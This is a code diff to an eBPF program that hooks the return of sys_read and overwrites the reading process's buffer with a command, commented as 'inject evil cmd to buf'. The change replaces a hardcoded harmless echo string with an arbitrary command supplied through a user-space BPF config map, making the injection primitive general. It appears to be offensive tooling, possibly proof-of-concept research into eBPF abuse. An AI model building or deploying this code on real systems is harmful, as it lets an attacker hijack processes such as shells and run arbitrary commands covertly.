@@ -20,6 +20,21 @@ struct {
     __type(value, struct event);
 } events SEC(".maps");
 
+#define MAX_COMMAND_LEN 128
+#define MAX_COMMAND_MASK (MAX_COMMAND_LEN - 1)
+
+struct config {
+    char command[MAX_COMMAND_LEN];
+    __u32 len_command;
+};
+
+struct {
+    __uint(type, BPF_MAP_TYPE_ARRAY);
+    __uint(max_entries, 1);
+    __type(key, int);
+    __type(value, struct config);
+} config_map SEC(".maps");
+
 // returns 0 if really handled
 static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
     // sys_read(unsigned int fd, char *buf, size_t count)
@@ -39,15 +54,23 @@ static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
     if (ret <= 0) {
         return 1;
     }
+    // dynamic read command from user space
+    int key = 0;
+    struct config *cfg;
+    cfg = bpf_map_lookup_elem(&config_map, &key);
+    if (!cfg) {
+        return 1;
+    }
+    __u32 len_command = cfg->len_command & MAX_COMMAND_MASK;
+    if (len_command == 0) {
+        return 1;
+    }
     // inject evil cmd to buf
     bool injected;
-    // TODO: dynamic read from user space
-    char newcommand[] = "echo Hello from eBPF!!! Nice to meet you \n#";
-    long new_len_with_null = sizeof(newcommand);
     // TODO: what if count < new_len_with_null?
-    if (count > new_len_with_null) {
+    if (count > len_command) {
         // TODO: insert/append instead of overwrite
-        bpf_probe_write_user(buf, newcommand, new_len_with_null);
+        bpf_probe_write_user(buf, cfg->command, len_command);
         injected = true;
     }
     // send event to user space
